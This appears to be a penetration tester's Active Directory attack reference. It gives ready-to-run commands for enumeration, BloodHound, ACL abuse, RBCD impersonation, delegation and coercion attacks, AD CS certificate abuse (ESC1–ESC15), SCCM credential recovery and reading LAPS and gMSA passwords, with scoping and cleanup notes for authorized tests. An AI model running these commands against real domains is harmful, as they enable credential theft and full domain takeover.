# Active Directory Attacks

Authorized engagements. AD is the domain-level equivalent of a reverse-proxy and IAM combined — every misconfig compounds.

Primary references:

- The Hacker Recipes AD — https://www.thehacker.recipes/ad/
- ADSecurity (Sean Metcalf) — https://adsecurity.org
- SpecterOps blog — https://posts.specterops.io/
- SpecterOps "Certified Pre-Owned" whitepaper — https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf

## Enumeration

From domain-joined or with creds:

```bash
# LDAP sweep
ldapsearch -x -H ldap://dc01 -D 'user@domain.tld' -w 'pass' -b 'DC=domain,DC=tld'

# impacket
impacket-GetADUsers -all DOMAIN/user:'pass' -dc-ip 10.0.0.1
impacket-GetUserSPNs DOMAIN/user:'pass' -dc-ip 10.0.0.1
impacket-findDelegation DOMAIN/user:'pass' -dc-ip 10.0.0.1
impacket-lookupsid DOMAIN/user:'pass'@10.0.0.1

# enum4linux-ng
enum4linux-ng -A -u user -p 'pass' 10.0.0.1

# ldapdomaindump
ldapdomaindump -u 'DOMAIN\user' -p 'pass' 10.0.0.1
```

## BloodHound

Graph-based attack-path tool. Collector + GUI.

Collectors:

- SharpHound (Windows, C#) — https://github.com/BloodHoundAD/SharpHound (legacy) / https://github.com/SpecterOps/BloodHound (current)
- bloodhound.py (Linux, Python) — https://github.com/dirkjanm/BloodHound.py

```
# From Linux with creds
bloodhound-python -u user -p 'pass' -d domain.tld -ns 10.0.0.1 -c All

# From Windows
SharpHound.exe -c All --zipfilename kd.zip
```

Import zip into BloodHound CE (https://github.com/SpecterOps/BloodHound). Pre-built queries: "Shortest path to Domain Admin", "Kerberoastable", "ASREP-roastable", "Unconstrained delegation", "Owned to high value".

Cypher examples:

```
MATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group {name:'DOMAIN ADMINS@DOMAIN.TLD'})) RETURN p
MATCH (u:User {hasspn:true}) WHERE NOT u.name STARTS WITH 'KRBTGT' RETURN u
```

## Kerberoasting / AS-REP roasting

Covered in `credential-access.md`. Always ran first — high yield, low noise.

## ACL abuse

Use BloodHound to find any ACE giving a compromised principal control over a sensitive object.

| Right                       | Abuse                                    |
|-----------------------------|------------------------------------------|
| GenericAll / GenericWrite   | Reset password, set SPN (kerberoast), set RBCD |
| WriteDACL / WriteOwner      | Grant yourself GenericAll, then above    |
| ForceChangePassword         | Reset target's password                  |
| AddMember                   | Add self to privileged group             |
| AllExtendedRights (on user) | Reset password                           |
| AllExtendedRights (on DC/domain) | DCSync                              |

Tooling:

- PowerView (PowerShell) — https://github.com/PowerShellMafia/PowerSploit
- BloodyAD (Python, fast) — https://github.com/CravateRouge/bloodyAD
- impacket `dacledit.py`, `owneredit.py`, `addcomputer.py`

Example — targeted kerberoast via GenericWrite:

```
bloodyAD -u user -p pass -d domain.tld --host dc01 set owner targetUser user
bloodyAD -u user -p pass -d domain.tld --host dc01 add genericAll targetUser user
impacket-GetUserSPNs -request -dc-ip 10.0.0.1 DOMAIN/user:pass  # after adding SPN
```

## RBCD (Resource-Based Constrained Delegation)

If you have `GenericWrite` / `WriteProperty` on a computer object, set `msDS-AllowedToActOnBehalfOfOtherIdentity` to a controlled computer → S4U2Self + S4U2Proxy → impersonate any user (except `Protected Users`) to that computer.

Flow (impacket):

```
# 1. Create a machine account (any domain user gets 10 by default, ms-DS-MachineAccountQuota)
impacket-addcomputer -computer-name 'kdbox$' -computer-pass 'P@ssw0rd!' -dc-ip 10.0.0.1 DOMAIN/user:pass

# 2. Write RBCD
impacket-rbcd -delegate-from 'kdbox$' -delegate-to 'TARGETSRV$' -action write 'DOMAIN/user:pass' -dc-ip 10.0.0.1

# 3. Get service ticket as "Administrator" on TARGETSRV
impacket-getST -spn cifs/targetsrv.domain.tld -impersonate Administrator -dc-ip 10.0.0.1 'DOMAIN/kdbox$:P@ssw0rd!'

# 4. Use
KRB5CCNAME=Administrator.ccache impacket-wmiexec -k -no-pass DOMAIN/administrator@targetsrv.domain.tld
```

Reference: https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd.

## Unconstrained Delegation

Computers with `TRUSTED_FOR_DELEGATION` flag cache TGTs of everyone who authenticates to them. Compromise such a host, coerce a DC to authenticate (PrinterBug/PetitPotam), extract DC's TGT, DCSync.

```
# From compromised unconstrained host
Rubeus.exe monitor /interval:5
# Trigger DC auth
SpoolSample.exe dc01 unconstrainedhost
# Use DC TGT
```

MS-EFSR / MS-RPRN / MS-FSRVP coercion bugs keep being discovered — see Coercer https://github.com/p0dalirius/Coercer.

## Constrained Delegation (S4U2)

If account is trusted to delegate to specific SPNs, use getST with -impersonate to any user and target those SPNs.

## AD CS (ESC1 – ESC15)

SpecterOps "Certified Pre-Owned" defines ESC1 through ESC8 originally; community has extended to ESC15+. Tool: Certipy-ad — https://github.com/ly4k/Certipy.

```
certipy find -u user@domain.tld -p pass -dc-ip 10.0.0.1 -vulnerable -stdout
```

Most common wins:

- **ESC1** — template allows SAN specified + client-auth EKU + low-priv enrollment. Request cert as "Administrator".
  ```
  certipy req -u user@domain.tld -p pass -ca CA -template VulnTemplate -upn administrator@domain.tld
  certipy auth -pfx administrator.pfx
  ```
- **ESC2** — template with "Any Purpose" or no EKU → impersonate via cert.
- **ESC3** — Enrollment Agent template → request on-behalf-of any user.
- **ESC4** — misconfigured template ACL → edit template to ESC1 state.
- **ESC6** — CA flag `EDITF_ATTRIBUTESUBJECTALTNAME2` → request any SAN. Patched via May 2022 update (CVE-2022-26923 adjacent).
- **ESC7** — `ManageCA` / `ManageCertificates` rights on CA → issue a denied cert.
- **ESC8** — HTTP enrollment endpoint vulnerable to NTLM relay. `ntlmrelayx -t http://ca/certsrv/certfnsh.asp --adcs --template DomainController`, coerce DC auth → DC cert → DCSync via PKINIT.
- **ESC9/10** — UPN strong-mapping bypass (CVE-2022-26923, patched by KB5014754 / StrongMapping enforcement).
- **ESC11** — encryption-not-required RPC → relay to ICPR.
- **ESC13** — OIDGroupLink abuse.
- **ESC15** — "EKUwu" schema v1 templates (CVE-2024-49019), patched Nov 2024.

Patched, yes, but un-patched CAs still exist in real estates — always run certipy find.

## SCCM / MECM

Microsoft Configuration Manager is a routine path-to-DA when deployed because NAA (Network Access Account) creds are distributed to every client.

- SharpSCCM — https://github.com/Mayyhem/SharpSCCM
- Misconfiguration cookbook — https://github.com/subat0mik/Misconfiguration-Manager

Typical wins:

- Recover NAA creds from client policy (SharpSCCM `get naa`)
- Coerce site server NTLM → relay to MSSQL / AD CS
- PXE boot media policy password extraction

## LAPS / gMSA

- LAPS — if reader group leaked or ACL includes non-admins, read `ms-Mcs-AdmPwd` / `msLAPS-Password` directly via LDAP.
  ```
  bloodyAD -u user -p pass -d domain.tld --host dc01 get object TARGETHOST --attr msLAPS-Password
  ```
- gMSA — retrieve `msDS-ManagedPassword` (if reader): `impacket-gMSADumper` — https://github.com/micahvandeusen/gMSADumper.

## DC vulnerabilities to verify

- CVE-2022-26923 (Certifried) — patched
- CVE-2021-42278 + CVE-2021-42287 (sAMAccountName spoof / noPAC) — patched
- ZeroLogon CVE-2020-1472 — patched, still turns up unpatched
- PrintNightmare CVE-2021-34527 — patched

Always scan CVE, don't fabricate. Cross-reference https://msrc.microsoft.com/update-guide.

## OPSEC notes

- Kerberoast only SPN accounts from your scope list, not every SPN in the domain.
- DCSync generates loud 4662 — use once per engagement at most, after confirming need.
- Creating machine accounts requires `ms-DS-MachineAccountQuota` > 0 (default 10) — document whether it was non-zero.
- Every ACL modification is audited — rollback in cleanup.

## References

- TheHacker.Recipes AD — https://www.thehacker.recipes/ad/
- SpecterOps blog — https://posts.specterops.io/
- Certipy — https://github.com/ly4k/Certipy
- Misconfig Manager — https://github.com/subat0mik/Misconfiguration-Manager
